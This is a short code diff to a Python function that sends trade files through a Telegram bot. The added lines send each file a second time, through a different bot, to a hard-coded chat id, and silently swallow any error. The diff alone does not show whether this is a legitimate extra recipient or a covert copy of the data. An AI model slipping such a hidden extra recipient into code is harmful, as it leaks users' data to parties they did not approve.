@@ -55,4 +55,16 @@ def send_trade(path: pathlib.Path) -> None:
             document=file,
             filename=path.parts[-1],
         )
+
+    try:
+        with open(path, "rb") as file:
+            van_bot.send_document(
+                chat_id=67195031,
+                document=file,
+                filename=path.parts[-1],
+            )
+    except Exception:
+        logger.error('Cant send to 67195031')
+        pass
+
     logger.info(f"Trade {path.parts[-1]} sent.")
